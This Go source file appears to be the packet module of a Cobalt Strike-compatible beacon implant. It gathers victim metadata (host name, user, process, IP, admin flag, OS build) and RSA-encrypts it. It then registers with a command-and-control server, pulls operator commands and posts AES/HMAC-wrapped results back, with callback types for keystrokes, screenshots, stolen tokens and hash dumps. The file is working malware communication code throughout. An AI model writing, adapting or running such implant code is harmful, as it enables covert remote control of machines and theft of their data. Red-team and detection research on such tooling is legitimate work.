package packet

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"main/config"
	"main/sysinfo"
	"main/util"
	"strconv"
	"strings"
	"time"
)

// all of this can be found in beacon.Job class
const (
	// IMPORTANT! windows default use codepage 936(GBK)
	// if using CALLBACK 0, CS server will handle result use charset attr in metadata, which will not cause Chinese garbled
	// BUT go deal character as utf8, so Chinese result generate by go will have an encoding problem
	CALLBACK_OUTPUT            = 0
	CALLBACK_KEYSTROKES        = 1
	CALLBACK_FILE              = 2
	CALLBACK_SCREENSHOT        = 3
	CALLBACK_CLOSE             = 4
	CALLBACK_READ              = 5
	CALLBACK_CONNECT           = 6
	CALLBACK_PING              = 7
	CALLBACK_FILE_WRITE        = 8
	CALLBACK_FILE_CLOSE        = 9
	CALLBACK_PIPE_OPEN         = 10
	CALLBACK_PIPE_CLOSE        = 11
	CALLBACK_PIPE_READ         = 12
	CALLBACK_POST_ERROR        = 13
	CALLBACK_PIPE_PING         = 14
	CALLBACK_TOKEN_STOLEN      = 15
	CALLBACK_TOKEN_GETUID      = 16
	CALLBACK_PROCESS_LIST      = 17
	CALLBACK_POST_REPLAY_ERROR = 18
	CALLBACK_PWD               = 19
	CALLBACK_LIST_JOBS         = 20
	CALLBACK_HASHDUMP          = 21
	CALLBACK_PENDING           = 22
	CALLBACK_ACCEPT            = 23
	CALLBACK_NETVIEW           = 24
	CALLBACK_PORTSCAN          = 25
	CALLBACK_DEAD              = 26
	CALLBACK_SSH_STATUS        = 27
	CALLBACK_CHUNK_ALLOCATE    = 28
	CALLBACK_CHUNK_SEND        = 29
	CALLBACK_OUTPUT_OEM        = 30
	CALLBACK_ERROR             = 31
	CALLBACK_OUTPUT_UTF8       = 32
)

var (
	encryptedMetaInfo []byte
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(buf *bytes.Buffer) uint32 {
	b := make([]byte, 4)
	_, _ = buf.Read(b)
	return binary.BigEndian.Uint32(b)
}

func ReadShort(buf *bytes.Buffer) uint16 {
	b := make([]byte, 2)
	_, _ = buf.Read(b)
	return binary.BigEndian.Uint16(b)
}

func DecryptPacket(b []byte) []byte {
	decrypted, err := util.AesCBCDecrypt(b, config.AesKey)
	if err != nil {
		panic(err)
	}
	return decrypted
}

func EncryptPacket() {

}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	//commandLenBytes := make([]byte, 4)
	//_, err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	commandLen := ReadInt(buf)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)
	return commandType, commandBuf

}

// MakePacket make reply command, return AES encoded data
func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := util.AesCBCEncrypt(buf.Bytes(), config.AesKey)
	if err != nil {
		return nil
	}
	buf.Reset()

	sendLen := len(encrypted) + util.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := util.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

// EncryptedMetaInfo return raw rsa encrypted data
func EncryptedMetaInfo() []byte {
	var tempPacket, packetUnencrypted, packetEncrypted []byte
	publicKey, err := util.GetPublicKey()
	// command without computer name
	if config.Support41Plus {
		tempPacket = MakeMetaInfo4plus()
		// no idea for -11 but just copy from issue#4
		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
		packetUnencrypted = MakeMetaInfo4plus()
	} else {
		tempPacket = MakeMetaInfo()
		config.ComputerNameLength = publicKey.Size() - len(tempPacket) - 11
		packetUnencrypted = MakeMetaInfo()
	}
	packetEncrypted, err = util.RsaEncrypt(packetUnencrypted, publicKey)
	if err != nil {
		panic(err)
	}
	return packetEncrypted
}

func MakeMetaInfo() []byte {
	util.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	osVersion := sysinfo.GetOSVersion()
	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIP()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()
	var port uint16 = 0
	metadataFlag := sysinfo.GetMetaDataFlag()

	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()

	// onlineInfoBytes : clientIDbytes (bigEnd), processIdbytes(bigEnd), portBytes, osInfoBytes
	//		osInfoBytes: ver, localIP, hostName, currentUser, processName
	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(portBytes, port)

	// osInfoBytes
	// ver,localIP,hostName,currentUser,processName
	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)

	// insert port
	osInfoBytes := make([]byte, len([]byte(osInfo))+1)
	osInfoSlicne := []byte(osInfo)
	osInfoBytes = append([]byte{metadataFlag}, osInfoSlicne...)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)

	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

/*
MetaData for 4.1

	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
func MakeMetaInfo4plus() []byte {
	util.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := sysinfo.GetMetaDataFlag()
	//for OS Version
	osVersion := sysinfo.GetOSVersion41Plus()
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}

	//for Smart Inject, will not be implemented
	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()

	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = metadataFlag
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, localIP)

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	osInfoBytes := []byte(osInfo)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func FirstBlood() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		_, err := HttpGet(encryptedMetaInfo)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
		}
		fmt.Println("firstblood: ok")
		break
	}
	return true
}

func PullCommand() ([]byte, error) {
	resp, err := HttpGet(encryptedMetaInfo)
	if err != nil {
		fmt.Printf("pull command fail: %s\b", err)
		return nil, err
	}
	return resp, nil
}

func PushResult(callBack int, b []byte) {
	// NOTICE !!!
	// only encoding CALLBACK_OUTPUT now as other callback data is generated by golang itself now.
	// because other callback type like CALLBACK_PENDING will have a pending bytes before the result, which would be considered as not utf8 string
	// there will be potential problems in dll injection and C# execution which doesn't use call back 0
	if callBack == CALLBACK_OUTPUT {
		utf8bytes, err := codepageToUTF8Native(b)
		if err != nil {
			// if there is encoding error, just return original error message
			finalPacket := MakePacket(callBack, b)
			HttpPost(finalPacket)
			return
		}
		finalPacket := MakePacket(callBack, utf8bytes)
		HttpPost(finalPacket)
		return
	}
	finalPacket := MakePacket(callBack, b)
	HttpPost(finalPacket)
}

func ErrorMessage(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	PushResult(CALLBACK_ERROR, result)
}
